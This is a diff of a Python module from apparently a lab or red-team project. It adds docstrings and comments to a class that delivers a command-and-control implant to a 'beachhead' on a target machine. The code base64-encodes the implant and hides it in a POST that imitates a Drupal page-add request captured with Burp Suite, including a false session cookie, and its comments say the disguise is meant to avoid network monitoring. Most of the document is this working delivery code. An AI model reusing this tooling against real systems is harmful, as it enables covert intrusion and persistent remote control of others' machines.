@@ -2,27 +2,58 @@ import requests
 from base64 import b64encode
 import pathlib
 
+
 PARENT_DIR = str(pathlib.Path(__file__).parent.absolute().parent.absolute()) + '/'
 
+
 class BeachheadSender:
+    """A class to send the Command and Control implant to the beachhead on the target machine"""
+
 
     def __init__(self, ip_addr: str, port: str, drupal_path: str, implant_file_path: str):
+        """Initializes the BeachheadSender class
+
+        This function will load the Command and Control implant from the given file path, and create a request 
+        to send it to the beachhead on the target machine.  The request will be stored in the request attribute,
+        but will not be sent until the send_request function is called.
+        """
+
         self.implant = self.load_implant(PARENT_DIR + implant_file_path)
         print("BEACHHEAD SENDER: implant created")
+
         self.request = self.create_request(ip_addr, port, drupal_path)
         print("BEACHHEAD SENDER: request created")
 
+
     def load_implant(self, implant_file_path: str):
+        """Loads the Command and Control implant from the given file path"""
+
         with open(implant_file_path, 'r') as f:
             filedata = f.read()
         return filedata
 
+
     def create_request(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
+        """Creates a request to send the Command and Control implant to the beachhead on the target machine
+        
+        The request will be stored in the request attribute, but will not be sent until the send_request function is called.
+
+        The request was created to match a request that updates a normal page on the Drupal site.  This was done to make
+        it less likely that the request would be detected by and network monitoring.  The initial activity was captured using
+        Burp Suite, and then the request was modified to include the Command and Control implant.
+
+        The request is, however, sent to the port that the beachhead is listening on, and the path is the path to the
+        web site.  The beachhead will then intercept the request and extract the Command and Control implant from it.
+        """
+
         url = "http://" + ip_addr + ":" + port + path
+
+        # Mimics an add page request
         params = { 'node': 'node/add/page',
                    'render': 'overlay',
                    'render': 'overlay' }
         
+        # The headers from the initial request, including a false Session ID
         headers = { 'Cache-Control': 'max-age=0',
                     'Upgrade-Insecure-Requests': '1',
                     'Origin': 'http://10.0.2.15',
@@ -35,8 +66,10 @@ class BeachheadSender:
                     'Cookie': 'Drupal.toolbar.collapsed=0; has_js=1; SESS3969c8b8b86a6735bbdf41499ed4dd1c=3egn8nOWzcqKC5eYSugFZt4YX9FXZ7m0aI45cswH0SQ',
                     'Connection': 'close'}
         
+        # The implant is encoded in base64 to make it easier to send in the request
         implant = b64encode(self.implant.encode('utf-8')).decode('utf-8')
 
+        # The data from the initial request, with the implant added
         data =  'title=Upload&body%5Bund%5D%5B0%5D%5Bsummary%5D=&body%5Bund%5D%5B0%5D%5B' 
         data += 'value%5D=' + implant + '&body%5Bund%5D%5B0%5D%5Bformat%5D=filtered_html'
         data += '&changed=&form_build_id=form-Btb_rPnHyH8wIkN0Bxu1chQt1WfW5fb8RwYdJL_oCEw'
@@ -45,14 +78,26 @@ class BeachheadSender:
         data += '&menu%5Bweight%5D=0&log=&path%5Balias%5D=&comment=1&name=metasploitable&date='
         data += '&status=1&additional_settings__active_tab=edit-menu&op=Save'
         
+        # Return the prepared request without sending it
         return requests.Request('POST', url=url, headers=headers, params=params, data=data)
     
+
     def send_request(self) -> requests.models.Response:
+        """Sends the request to the beachhead on the target machine
+        
+        Loads the request from the request attribute, and sends it to the beachhead on the target machine.
+
+        Since the beachhead doesn't send back any acknowledgement that it received the request, this function will
+        catch the error that is thrown when the request is closed with no response, and print a message to the console.
+        """
+
         s = requests.Session()
+        
         try:
             prepped = s.prepare_request(self.request)
             s.send(prepped, verify=False, timeout=1)
             print("BEACHHEAD SENDER: cnc sent")
+
         except requests.exceptions.ConnectionError as e:
             print(e)
 
